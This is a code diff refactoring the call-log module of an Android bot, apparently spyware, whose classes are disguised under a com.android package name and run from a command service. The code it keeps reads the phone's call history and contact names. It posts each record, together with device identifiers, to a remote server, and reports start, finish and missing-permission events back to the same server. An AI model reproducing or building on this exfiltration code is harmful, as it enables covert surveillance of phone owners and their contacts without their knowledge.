@@ -8,27 +8,24 @@ import android.provider.CallLog;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandReceiverService;
-import com.android.adobot.CommonParams;
+import com.android.adobot.CommandService;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashMap;
 
+import com.android.adobot.Constants;
 import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
 
 public class GetCallLogsTask extends BaseTask {
 
     private static String TAG = "GetCallLogsTask";
-
-    private static final String POSTURL = "/call-logs";
-    private CommonParams commonParams;
     private int numlogs;
 
-    public GetCallLogsTask(CommandReceiverService client, int numlogs) {
+    public GetCallLogsTask(CommandService client, int numlogs) {
         setContext(client);
         this.numlogs = numlogs;
-        this.commonParams = new CommonParams(client);
     }
 
     @Override
@@ -48,8 +45,8 @@ public class GetCallLogsTask extends BaseTask {
             start.put("uid", commonParams.getUid());
             start.put("device", commonParams.getDevice());
             Http startHttp = new Http();
-            startHttp.setUrl(commonParams.getServer() + "/notify");
-            startHttp.setMethod("POST");
+            startHttp.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            startHttp.setMethod(HttpRequest.METHOD_POST);
             startHttp.setParams(start);
             startHttp.execute();
 
@@ -66,7 +63,7 @@ public class GetCallLogsTask extends BaseTask {
                 do {
                     Log.i(TAG, "This number: " + this.numlogs);
                     String phNumber = managedCursor.getString(number);
-                    String nameS = getContactName(context.getApplicationContext(), phNumber);
+                    String nameS = getContactName(phNumber);
                     String callType = managedCursor.getString(type);
                     String callDate = managedCursor.getString(date);
                     Date callDayTime = new Date(Long.valueOf(callDate));
@@ -83,8 +80,8 @@ public class GetCallLogsTask extends BaseTask {
                     p.put("duration", callDuration);
 
                     Http req = new Http();
-                    req.setMethod("POST");
-                    req.setUrl(commonParams.getServer() + POSTURL);
+                    req.setMethod(HttpRequest.METHOD_POST);
+                    req.setUrl(commonParams.getServer() + Constants.POST_CALL_LOGS_URL);
                     req.setParams(p);
                     req.execute();
                     this.numlogs--;
@@ -95,8 +92,8 @@ public class GetCallLogsTask extends BaseTask {
             start.put("uid", commonParams.getUid());
             start.put("device", commonParams.getDevice());
             Http doneHttp = new Http();
-            doneHttp.setUrl(commonParams.getServer() + "/notify");
-            doneHttp.setMethod("POST");
+            doneHttp.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneHttp.setMethod(HttpRequest.METHOD_POST);
             doneHttp.setParams(start);
             doneHttp.execute();
 
@@ -110,8 +107,8 @@ public class GetCallLogsTask extends BaseTask {
             noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "READ_CALL_LOG");
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + "/notify");
-            doneSMS.setMethod("POST");
+            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(noPermit);
             doneSMS.execute();
 
